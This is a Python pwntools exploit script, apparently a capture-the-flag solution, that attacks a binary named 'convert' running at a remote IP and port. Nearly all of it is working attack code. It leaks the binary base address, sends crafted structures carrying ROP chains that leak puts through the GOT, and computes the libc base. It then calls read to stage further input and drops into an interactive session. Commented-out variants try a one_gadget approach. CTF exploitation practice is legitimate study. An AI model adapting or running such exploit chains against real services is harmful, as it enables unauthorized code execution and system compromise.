#!/usr/bin/env python3
from pwn import *

context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', '-d', 'Debian', 'bash', '-c']
context.arch = 'amd64'
host = '34.143.130.87'
port = 4001
elf_name = './convert'
elf = ELF(elf_name)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('./libc6_2.23-0ubuntu11.2_amd64.so')
# breakrva 0x150C
# breakrva 0x1568
# breakrva 0x13C9
# breakrva 0x1259
script = '''
breakrva 0x000000000000150C
breakrva 0x1568
breakrva 0x1685
breakrva 0x1AC1
c
'''
script += 'c\n'*5
if args.LOCAL:
    p = process(elf_name)
elif args.GDB:
    p = process(elf_name)
    gdb.attach(p, gdbscript=script)
else:
    p = remote(host, port)

p.recvuntil(b'you ^^\n')
bin_base = u64(p.recv(6) + b'\x00\x00') - 0x1ADA
log.info("bin base " + hex(bin_base))
elf.address = bin_base

def construct(doconvert, cmd, content):
    struct = doconvert 
    struct += b'\x00'*(4 - len(struct))
    struct += cmd
    struct += b'\x00'*(8 - len(struct))
    struct += content
    return struct

linkedlist = 0x4080 + bin_base
rdi = 0x0000000000001c0b + bin_base
rsi_r15 = 0x0000000000001c09 + bin_base
pop1 = 0x0000000000001c0a + bin_base        # r15
pop2 = 0x0000000000001c08 + bin_base        # r14_r15
ret = 0x0000000000001016 + bin_base
main = 0x1AC1 + bin_base

# payload = b'222\x00' + p32(0x90-48-1)
payload = p32(0x61) + p32(0xc8-48-8)
payload += b'\x00'*(0x30 - len(payload))
p.send(construct(b'1', b'htb', payload))    #1

ropchain = b''.join(map(p64, [rdi, elf.got['puts'], elf.plt['puts'], ret, pop1]))   
payload = p64(0x61) + ropchain
payload += b'\x00'*(0x30 - len(payload))
p.send(construct(b'1', b'htb', payload))    #2

ropchain = [rdi, 0, ret, pop2]                          # rdi = 0
ropchain = b''.join(map(p64, ropchain))
payload = p64(0x61) + ropchain + p64(linkedlist - 0x10)
p.send(construct(b'1', b'htb', payload))    #3

ropchain = [rsi_r15, linkedlist, 0, elf.plt['read'], main]            # rsi = 0
ropchain = b''.join(map(p64, ropchain))
payload = p64(0x61) + ropchain  
p.send(construct(b'1', b'htb', payload))    #4

payload = p64(0x61) + ropchain  
p.send(construct(b'0', b'htb', payload))    #5


p.recvuntil(b'001000100010\n')
libc_base = u64(p.recv(6) + b'\x00\x00') - libc.sym['puts']
libc.address = libc_base
log.info("leak libc base " + hex(libc_base))

####################3

# linkedlist = 0x4080 + bin_base
# rdi = 0x0000000000001c0b + bin_base
# main = 0x1AC1 + bin_base

# payload = b'222\x00' + p32(0xc8-56)
# payload += b'\x00'*(0x30 - len(payload))
# p.sendafter(b'server!\n', construct(b'1', b'htb', payload))

# ropchain = [rdi, elf.got['puts'], elf.plt['puts'], main]
# ropchain = b''.join(map(p64, ropchain))
# rop = ROP(libc)
# rop(rax=0)
# one_gadget = 0x45226 + libc_base

# payload = b'1111111\x00' + rop.chain() + p64(one_gadget) 
# payload += b'\x00'*(0x30 - len(payload))
# p.send(construct(b'1', b'htb', payload))

# p.send(construct(b'1', b'htb', b'1'*(0x30-9) + b'\x00' + p64(linkedlist-0x10)))
# p.send(construct(b'0', b'htb', b'3333'*3 + b'\x00'))



# ropchain = [rdi, elf.got['puts'], elf.plt['puts'], main]
# ropchain = b''.join(map(p64, ropchain))

# p.send(construct(b'0', b'htb', p64(0) + ropchain))





# payload = payload[:-0x14] + p32(1) + payload[-0x14+4:]
# p.send(construct(b'0', b'htb', b'1'*0x30))

p.interactive()
